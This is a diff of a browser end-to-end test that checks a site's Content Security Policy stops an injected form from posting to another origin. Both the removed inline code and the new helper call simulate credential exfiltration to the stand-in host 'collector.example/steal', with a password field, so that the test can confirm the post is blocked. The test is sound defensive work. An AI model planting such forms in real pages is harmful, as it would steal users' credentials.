@@ -7,6 +7,7 @@ import {
 	login,
 	logout,
 	PASSWORD,
+	postInjectedForm,
 	resetLocalIpLimit,
 	signupUser,
 	uniqueEmail,
@@ -87,30 +88,10 @@ test("pages' forms post to this origin only", async ({ page }) => {
 	await waitForHydration(page)
 	// A form that injected HTML would add, posting what it collects to another site, is stopped
 	// before anything leaves the page.
-	const reached: string[] = []
-	await page.route("https://collector.example/**", (route) => {
-		reached.push(route.request().url())
-		return route.fulfill({ body: "collected" })
+	expect(await postInjectedForm(page, "https://collector.example/steal")).toEqual({
+		outcome: "form-action",
+		reached: [],
 	})
-	const violated = await page.evaluate(
-		() =>
-			new Promise<string>((resolve) => {
-				document.addEventListener("securitypolicyviolation", (event) =>
-					resolve(event.effectiveDirective),
-				)
-				const form = document.createElement("form")
-				form.method = "post"
-				form.action = "https://collector.example/steal"
-				const field = document.createElement("input")
-				field.name = "password"
-				field.value = "secret"
-				form.append(field)
-				document.body.append(form)
-				form.submit()
-			}),
-	)
-	expect(violated).toBe("form-action")
-	expect(reached).toEqual([])
 
 	// The sign-in pages also let their own forms go on to the providers they offer: GitHub here.
 	const login = await page.request.get("/login")
